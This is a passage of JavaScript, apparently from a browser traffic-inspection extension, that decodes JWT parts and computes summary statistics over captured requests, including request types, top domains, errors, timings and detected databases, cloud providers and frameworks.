    const header = JSON.parse(atob(parts[0].replace(/-/g, "+").replace(/_/g, "/")));
    const payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
    return { header, payload };
  } catch { return null; }
}

// ── webRequest helpers ────────────────────────────────────────────────────────
function extractDomain(url) { try { return new URL(url).hostname; } catch { return url; } }
function simplifyHeaders(headers) { const out = {}; for (const h of headers) out[h.name.toLowerCase()] = h.value; return out; }
function getContentLength(headers) { for (const h of headers) { if (h.name.toLowerCase() === "content-length") return parseInt(h.value, 10) || null; } return null; }

function computeStats(caps) {
  const byType = (t) => caps.filter((c) => c.captureType === t);
  const http = byType("http"), ws = byType("websocket"), dom = byType("dom"),
        iframe = byType("iframe"), xhr = byType("xhr"), fetch_ = byType("fetch");
  const dbHits = {}, cloudHits = {}, frameworkHits = {};
  for (const c of caps) {
    if (!c.stackInfo) continue;
    for (const db of c.stackInfo.databases || []) dbHits[db] = (dbHits[db] || 0) + 1;
    if (c.stackInfo.cloud) cloudHits[c.stackInfo.cloud] = (cloudHits[c.stackInfo.cloud] || 0) + 1;
    if (c.stackInfo.framework) frameworkHits[c.stackInfo.framework] = (frameworkHits[c.stackInfo.framework] || 0) + 1;
  }
  const topDatabases = Object.entries(dbHits).sort((a,b)=>b[1]-a[1]).slice(0,8).map(([name,count])=>({name,count}));
  const domainCounts = {};
  for (const c of http) domainCounts[c.domain] = (domainCounts[c.domain] || 0) + 1;
  const topDomains = Object.entries(domainCounts).sort((a,b)=>b[1]-a[1]).slice(0,10).map(([domain,count])=>({domain,count}));
  const typeCounts = {};
  for (const c of http) typeCounts[c.type] = (typeCounts[c.type] || 0) + 1;
  const fingerprintedCount = caps.filter((c) => c.stackInfo).length;
  const errorCount = http.filter((c) => c.status === "error" || (c.statusCode && c.statusCode >= 400)).length;
  const durations = http.filter((c) => c.duration).map((c) => c.duration);
  const avgDuration = durations.length ? Math.round(durations.reduce((a,b)=>a+b,0)/durations.length) : 0;
  return { total: caps.length, http: http.length, websocket: ws.length, dom: dom.length, iframe: iframe.length, xhr: xhr.length, fetch: fetch_.length, topDomains, typeCounts, errorCount, avgDuration, fingerprintedCount, topDatabases, cloudHits, frameworkHits };
}
